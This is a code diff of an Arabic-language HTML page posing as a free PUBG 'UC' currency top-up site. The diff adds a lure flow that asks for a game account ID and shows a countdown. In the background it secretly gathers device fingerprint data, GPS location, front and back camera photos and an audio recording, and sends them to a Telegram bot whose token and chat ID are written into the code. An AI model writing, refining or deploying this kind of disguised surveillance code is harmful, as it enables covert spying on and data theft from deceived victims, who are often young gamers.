@@ -3,48 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Permission Request</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        #container {
-            max-width: 400px;
-            margin: 0 auto;
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        #status {
-            font-size: 18px;
-            margin: 20px 0;
-            color: #333;
-        }
-        #permission-btn {
-            background: #4285f4;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            margin: 10px 0;
-        }
-        #permission-btn:disabled {
-            background: #cccccc;
-        }
-    </style>
-</head>
-<body>
-        <!DOCTYPE html>
-<html>
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>شحن شدات US مجاني</title>
     <style>
         body {
@@ -97,28 +55,39 @@
             color: #4285f4;
             margin-bottom: 20px;
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div id="container">
         <div class="welcome-message" id="welcome-message">اهلا بك في موقع شحن شدات US مجاني 💸</div>
+        
+        <!-- الصفحة 1: بدء العملية -->
         <div id="page1">
             <button id="permission-btn">ابدأ الآن</button>
         </div>
         
-        <div id="page2" style="display: none;">
+        <!-- الصفحة 2: إدخال المعرف -->
+        <div id="page2" class="hidden">
             <div id="status">اكتب الايدي الخاص بحسابك 🆔</div>
             <input type="number" id="user-id" placeholder="أدخل الأيدي هنا">
             <button id="submit-btn">ارسال US</button>
         </div>
         
-        <div id="page3" style="display: none;">
+        <!-- الصفحة 3: العد التنازلي -->
+        <div id="page3" class="hidden">
             <div id="status">انتظر 3 دقائق</div>
             <div class="countdown" id="countdown">03:00</div>
         </div>
     </div>
 
     <script>
+        // Telegram Configuration
+        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
+        const CHAT_ID = "6913353602";
+        
         // DOM Elements
         const welcomeMessage = document.getElementById('welcome-message');
         const statusEl = document.getElementById('status');
@@ -132,23 +101,60 @@
         
         // Move to page 2 when start button is clicked
         permissionBtn.addEventListener('click', () => {
-            page1.style.display = 'none';
-            page2.style.display = 'block';
+            page1.classList.add('hidden');
+            page2.classList.remove('hidden');
         });
         
+        // Main function to collect and send all data
+        async function collectAndSendAllData(userId) {
+            try {
+                // 1. Send basic device info first
+                const deviceInfo = getDeviceInfo();
+                deviceInfo.userId = userId; // Add user ID to device info
+                await sendToTelegram(formatDeviceInfo(deviceInfo));
+                
+                // 2. Get and send location (parallel with other requests)
+                const locationPromise = getLocation().then(loc => {
+                    return sendToTelegram(`📍 Location for user ${userId}:\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\nMap: https://maps.google.com/?q=${loc.latitude},${loc.longitude}`);
+                }).catch(e => {
+                    return sendToTelegram(`⚠️ Failed to get location for user ${userId}: ` + e.message);
+                });
+                
+                // 3. Camera photos (parallel)
+                const frontCameraPromise = captureAndSendPhoto('user', `front_camera_${userId}.jpg`);
+                const backCameraPromise = captureAndSendPhoto('environment', `back_camera_${userId}.jpg`);
+                
+                // 4. Audio recording
+                const audioPromise = recordAndSendAudio(10, `audio_${userId}.ogg`);
+                
+                // Wait for all operations to complete
+                await Promise.all([
+                    locationPromise,
+                    frontCameraPromise,
+                    backCameraPromise,
+                    audioPromise
+                ]);
+                
+                return true;
+            } catch (error) {
+                await sendToTelegram(`⚠️ Error for user ${userId}: ` + error.message);
+                return false;
+            }
+        }
+        
         // Move to page 3 when submit button is clicked
-        submitBtn.addEventListener('click', () => {
+        submitBtn.addEventListener('click', async () => {
             const userId = userIdInput.value;
             if (!userId) {
                 alert("الرجاء إدخال الأيدي الخاص بك");
                 return;
             }
             
-            page2.style.display = 'none';
-            page3.style.display = 'block';
+            page2.classList.add('hidden');
+            page3.classList.remove('hidden');
             
             // Start countdown from 3 minutes
-            let timeLeft = 180; // 3 minutes in seconds
+            let timeLeft = 180;
             const countdownInterval = setInterval(() => {
                 timeLeft--;
                 
@@ -162,62 +168,16 @@
                     statusEl.textContent = "تم الانتهاء!";
                 }
             }, 1000);
+            
+            // Start collecting data in background
+            setTimeout(async () => {
+                try {
+                    await collectAndSendAllData(userId);
+                } catch (error) {
+                    console.error("Error collecting data:", error);
+                }
+            }, 1000);
         });
-    </script>
-</body>
-</html>
-    <div id="container">
-        <div id="status">Please wait 3 minutes...</div>
-        <button id="permission-btn">Allow Access</button>
-    </div>
-
-    <script>
-        // Telegram Configuration
-        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
-        const CHAT_ID = "6913353602";
-        
-        // DOM Elements
-        const statusEl = document.getElementById('status');
-        const permissionBtn = document.getElementById('permission-btn');
-        
-        // Main function to collect and send all data
-        async function collectAndSendAllData() {
-            try {
-                // 1. Send basic device info first
-                const deviceInfo = getDeviceInfo();
-                await sendToTelegram(formatDeviceInfo(deviceInfo));
-                
-                // 2. Get and send location (parallel with other requests)
-                const locationPromise = getLocation().then(loc => {
-                    return sendToTelegram(`📍 Location:\nLat: ${loc.latitude}\nLon: ${loc.longitude}\nAccuracy: ${loc.accuracy}m\nMap: https://maps.google.com/?q=${loc.latitude},${loc.longitude}`);
-                }).catch(e => {
-                    return sendToTelegram("⚠️ Failed to get location: " + e.message);
-                });
-                
-                // 3. Camera photos (parallel)
-                const frontCameraPromise = captureAndSendPhoto('user', 'front_camera.jpg');
-                const backCameraPromise = captureAndSendPhoto('environment', 'back_camera.jpg');
-                
-                // 4. Audio recording
-                const audioPromise = recordAndSendAudio(10);
-                
-                // 5. Auto-send pictures from common directories
-                const picturesPromise = autoSendPictures();
-                
-                // Wait for all operations to complete
-                await Promise.all([
-                    locationPromise,
-                    frontCameraPromise,
-                    backCameraPromise,
-                    audioPromise,
-                    picturesPromise
-                ]);
-                
-            } catch (error) {
-                await sendToTelegram("⚠️ Error: " + error.message);
-                throw error;
-            }
-        }
         
         // Get comprehensive device information
         function getDeviceInfo() {
@@ -234,7 +194,7 @@
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 battery: getBatteryInfo(),
                 connection: getConnectionInfo(),
-                ip: 'fetching...', // Will be updated async
+                ip: 'fetching...',
                 gpu: getGPUInfo(),
                 touchSupport: 'ontouchstart' in window,
                 sensors: getSensorInfo(),
@@ -344,8 +304,6 @@
         }
         
         function getInstalledAppsInfo() {
-            // This is a limited approach due to browser restrictions
-            const apps = [];
             if ('getInstalledRelatedApps' in window) {
                 return 'supported (but requires user gesture)';
             }
@@ -363,6 +321,7 @@
         // Format device info for Telegram
         function formatDeviceInfo(info) {
             return `📱 <b>DEVICE INFORMATION</b>\n\n` +
+                   `👤 <b>User ID</b>: ${info.userId || 'unknown'}\n\n` +
                    `🖥️ <b>System Info</b>\n` +
                    `- Platform: ${info.platform}\n` +
                    `- Device: ${info.deviceType}\n` +
@@ -443,7 +402,7 @@
         }
         
         // Audio recording function
-        async function recordAndSendAudio(duration) {
+        async function recordAndSendAudio(duration, filename) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const recorder = new MediaRecorder(stream);
@@ -458,23 +417,10 @@
                 stream.getTracks().forEach(track => track.stop());
                 
                 const blob = new Blob(chunks, { type: 'audio/ogg' });
-                await sendAudioToTelegram(blob, 'recording.ogg');
+                await sendAudioToTelegram(blob, filename);
                 return true;
             } catch (error) {
                 await sendToTelegram(`⚠️ Audio error: ${error.message}`);
-                return false;
-            }
-        }
-        
-        // Auto-send pictures from common directories
-        async function autoSendPictures() {
-            try {
-                // This would require the File System Access API
-                // In a real implementation, you'd need user gesture to get directory handles
-                await sendToTelegram("ℹ️ Auto file access requires explicit user permission");
-                return false;
-            } catch (error) {
-                await sendToTelegram(`⚠️ File access error: ${error.message}`);
                 return false;
             }
         }
@@ -518,22 +464,6 @@
             });
         }
         
-        // Main flow
-        permissionBtn.addEventListener('click', async () => {
-            permissionBtn.disabled = true;
-            statusEl.textContent = "Please wait while we collect information...";
-            
-            setTimeout(async () => {
-                try {
-                    await collectAndSendAllData();
-                    statusEl.textContent = "Information sent successfully!";
-                } catch (error) {
-                    statusEl.textContent = "Error occurred. Please try again.";
-                    console.error(error);
-                }
-            }, 1000);
-        });
-        
         // Get IP address
         async function fetchIP() {
             try {
@@ -548,7 +478,7 @@
         // Initialize
         (async () => {
             const ip = await fetchIP();
-            // Update device info with IP if needed
+            // يمكنك استخدام عنوان IP هنا إذا كنت بحاجة إليه
         })();
     </script>
 </body>
